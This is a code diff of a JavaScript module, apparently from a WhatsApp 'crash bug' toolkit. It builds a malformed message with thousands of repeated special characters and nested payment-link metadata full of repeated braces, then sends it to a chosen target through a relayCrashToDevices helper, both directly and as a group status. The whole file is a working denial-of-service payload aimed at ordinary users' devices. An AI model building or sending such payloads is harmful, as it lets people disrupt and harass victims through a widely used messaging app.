@@ -1,49 +1,22 @@
 const { relayCrashToDevices } = require('../target-utils');
-/*
- * © 2026 SeXyxeon (VOIDSEC)
- *
- * ⚠️ COPYRIGHT NOTICE
- * This source code is protected under copyright law.
- * Any form of re-uploading, recoding, modification,
- * selling, or redistribution WITHOUT explicit permission
- * from the original author is strictly prohibited.
- *
- * ❌ NO CREDIT = NO PERMISSION
- * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
- *
- * ✔️ Usage or modification is allowed ONLY
- * with prior permission and proper credit.
- *
- * OFFICIAL LINKS (ONLY):
- * YouTube   : https://youtube.com/@voidsec7718
- * Instagram : sabir._7718
- * Telegram  : https://t.me/SABIR7718
- * GitHub    : https://github.com/SABIR7718
- * WhatsApp  : +91 73650 85213
- *
- * Violations may result in DMCA takedown
- * or termination of the Telegram bot.
- */
-
-const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
 async function xbetainvis(SYxS7, target) {
-    const msg = generateWAMessageFromContent(target, {
+    const msg = {
         extendedTextMessage: {
-            text: "",
+            text: ". xbetainvis " + "ꦾ".repeat(1000),
             matchedText: "https://t.me/devor6core",
-            description: "",
-            title: "",
+            description: "BetaInvisible Overload",
+            title: "BetaInvisible",
             paymentLinkMetadata: {
-                button: { displayText: "" },
+                button: { displayText: "PAY" },
                 header: { headerType: 1 },
-                provider: { paramsJson: "{{".repeat(5000) }
+                provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
             },
             linkPreviewMetadata: {
                 paymentLinkMetadata: {
-                    button: { displayText: "" },
+                    button: { displayText: "PAY" },
                     header: { headerType: 1 },
-                    provider: { paramsJson: "{{".repeat(5000) }
+                    provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
                 },
                 urlMetadata: { fbExperimentId: 999 },
                 fbExperimentId: 888,
@@ -51,21 +24,24 @@ async function xbetainvis(SYxS7, target) {
                 socialMediaPostType: 1221
             }
         }
-    }, {
-        additionalAttributes: { edit: "7" }
-    });
+    };
 
     try {
-        await relayCrashToDevices(SYxS7, target, {
+        const r1 = await relayCrashToDevices(SYxS7, target, {
             groupStatusMessageV2: {
-                message: msg.message
+                message: msg
             }
         });
-        await relayCrashToDevices(SYxS7, target, msg.message);
+        const r2 = await relayCrashToDevices(SYxS7, target, msg);
+        return {
+            success: r1.success || r2.success,
+            deliveredCount: r1.deliveredCount + r2.deliveredCount,
+            errors: [...r1.errors, ...r2.errors]
+        };
     } catch (error) {
         console.log(`[ 🗑️ ] Error on xbetainvis message: ${error.message}`);
+        return { success: false, deliveredCount: 0, errors: [error.message] };
     }
 }
-
 
 module.exports = { xbetainvis };
